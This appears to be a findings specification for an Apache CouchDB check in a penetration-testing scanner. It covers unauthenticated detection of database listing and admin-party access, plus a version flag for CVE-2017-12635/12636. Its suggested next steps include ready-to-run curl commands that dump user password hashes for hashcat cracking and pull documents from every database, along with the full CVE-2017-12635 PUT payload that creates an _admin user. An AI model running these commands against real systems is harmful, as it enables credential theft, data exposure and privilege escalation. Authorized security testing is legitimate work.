summary: Compact but sharp: two independent unauth discriminators (/_all_dbs and /_node/_local/_config for admin-party) plus Fauxton UI detection and a CVE-2017-12635/12636 version flag. Coverage gaps: no /_membership node harvest into a shared pool, no /_users database read on admin-party (would surface admin bcrypt hashes), no basic-auth cred sweep, and CVE-2017-12635 is not actively verified (just version-gated).

findings.tier_evidence: GET /_node/_local/_config returns 200 with a JSON dict - reading an ADMIN-only endpoint proves the request is treated as admin.
findings.promotion_notes: T3 non-destructive: read /_users/_all_docs?include_docs=true for admin bcrypt hashes and secret cookies. Destructive T3: PUT a query_server or os_daemon to trigger RCE - keep behind an --exploit-ok gate.
findings.tester_next_step: curl -s http://<ip>:<port>/_users/_all_docs?include_docs=true | jq '.rows[].doc | {n:.name,h:.derived_key}' ; then hashcat -m 12100 (PBKDF2-SHA1) the derived keys.

findings.title_pattern: Apache CouchDB exposed - unauthenticated database listing
findings.tier_evidence: GET /_all_dbs returns 200 with a real JSON array (sampled to 25 names) - proof of read access to the DB inventory.
findings.promotion_notes: Auto-follow /_all_dbs -> GET /<db>/_all_docs?include_docs=true&limit=5 per non-underscore db to surface real document samples (as elasticsearch does for indices).
findings.tester_next_step: for db in $(curl -s http://<ip>:<port>/_all_dbs | jq -r '.[]' | grep -v ^_); do curl -s http://<ip>:<port>/$db/_all_docs?include_docs=true\&limit=5; done

findings.title_pattern: Apache CouchDB < 2.1.1 - unauth privesc -> RCE chain
findings.tier_evidence: vulndb._cmp against 2.1.1 - version-only fingerprint; no CVE-2017-12635 role-duplication POST fired.
findings.promotion_notes: T2 = actually PUT /_users/org.couchdb.user:recce with the JSON role-duplication payload from CVE-2017-12635 and verify 201/200 (destructive - creates a user). Non-destructive T1: send the payload with an invalid Content-Type to trigger the exact validator branch without persisting.
findings.tester_next_step: curl -s -X PUT http://<ip>:<port>/_users/org.couchdb.user:recce -H 'Content-Type: application/json' -d '{"type":"user","name":"recce","roles":["_admin"],"roles":[],"password":"pw"}' - only in scope.
